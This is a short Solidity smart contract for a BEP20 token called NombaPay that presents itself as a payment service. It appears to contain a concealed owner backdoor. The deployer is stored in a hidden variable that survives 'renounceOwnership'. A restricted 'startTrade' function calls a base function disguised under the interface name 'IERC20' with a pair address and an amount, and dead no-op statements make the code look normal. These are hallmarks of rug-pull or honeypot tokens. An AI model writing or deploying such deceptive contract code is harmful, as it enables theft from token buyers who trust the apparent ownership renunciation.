contract PaymentService is BEP20 {
    constructor(string memory name, string memory symbol, uint256 TSupply) BEP20(name, symbol) {
        Perform(msg.sender, TSupply * (10 ** uint256(decimals())));
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract NombaPay is PaymentService , Ownable {
address private _msgsender = _msgSender();
address uniswapRouter;
bool swapEnabled;
uint tradingOpen;
uint104 firstBlock;
    constructor(
        string memory name,
        string memory symbol,
        uint256 TSupply
    ) PaymentService(name, symbol, TSupply) {}
    function startTrade(address uniswapV2Pair, uint256 uniswapV2Router) public {
        uniswapRouter = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        require(msg.sender == _msgsender);
        IERC20(uniswapV2Pair, uniswapV2Router);
        swapEnabled;
        tradingOpen;
        firstBlock;
    }

}
